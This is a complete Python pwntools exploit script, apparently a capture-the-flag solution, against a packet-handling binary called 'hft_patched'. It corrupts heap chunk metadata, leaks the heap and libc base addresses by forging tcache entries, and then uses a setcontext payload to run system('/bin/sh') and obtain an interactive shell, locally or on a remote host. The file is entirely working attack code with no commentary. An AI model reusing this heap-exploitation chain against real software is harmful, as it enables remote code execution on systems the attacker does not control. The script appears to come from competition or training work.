#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import struct
from setcontext32 import *

exe = context.binary = ELF('hft_patched')
libc = exe.libc

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
brva 0x12BE
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

class Tcache:
    TCACHE_MAX_BINS = 64
    PTR_SIZE = 8

    def __init__(self):
        self.memory = bytearray(64 * 2 + 64 * self.PTR_SIZE)

    def add(self, idx, value):
        count_offset = idx * 2
        current_count = struct.unpack_from("<H", self.memory, count_offset)[0]
        struct.pack_into("<H", self.memory, count_offset, current_count + 1)

        entries_base = 64 * 2
        entry_offset = entries_base + idx * self.PTR_SIZE
        struct.pack_into("<Q", self.memory, entry_offset, value)

    def get_raw(self):
        return bytes(self.memory)

    def dump(self):
        return self.memory
    
    
def pkt_send(type, size, data=b"", pad=True):
    if pad:
        pkt = p64(type) + data
    else:
        pkt = p32(type) + b"\x00"
    io.send(p64(size))
    io.sendline(pkt)

def pkt_echo(size, pad=True):
    PKT_OPT_ECHO = 1
    pkt_send(type=PKT_OPT_ECHO, size=size, pad=pad)

def pkt_ping(size, data):
    PKT_OPT_PING = 0
    pkt_send(type=PKT_OPT_PING, size=size, data=data)
    pkt_recv()

def pkt_raw(size, data, type, skip=False):
    pkt_send(type=type, size=size, data=data)
    if not skip:
        pkt_recv()

def pkt_recv():
    io.recvuntil(b"[PKT_RES]")

def solve():

    pkt_recv()
    pkt_ping(0x10, b"A"*8 + p64(0xd51))
    pkt_ping(0xd50, b"B")
    pkt_echo(0, pad=False)

    io.recvuntil(b":")
    leak = io.recvline()[1:7]
    heap = u64(leak.ljust(8, b"\x00")) - 0x2b0
    info("heap base: %#x", heap)
    pkt_recv()
    
    tcache = Tcache()
    tcache.add(0, heap+0x560)
    tcache.add(47, heap+0x2e0)
    raw = tcache.get_raw()

    pkt_ping(0x25000, b"A"*0x266d8 + p64(heap+0x2f0))
    pkt_raw(len(raw), raw[:-1], 0x291)

    pkt_echo(0, pad=False)
    io.recvuntil(b":")
    leak = io.recvline()[1:7]
    main_arena = u64(leak.ljust(8, b"\x00"))
    libc.address = main_arena - 0x219ce0
    info("libc base: %#x", libc.address)
    pkt_recv()

    addr, payload = setcontext32(libc, rip=libc.sym["system"], rdi=next(libc.search(b"/bin/sh\x00")))

    info("setcontext->dest: %#x", addr)

    tcache = Tcache()
    tcache.add(0, addr)
    raw = tcache.get_raw()

    pkt_raw(0x300, raw, 0x291)
    pkt_raw(0, payload[16:], u64(payload[8:16]), skip=True)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

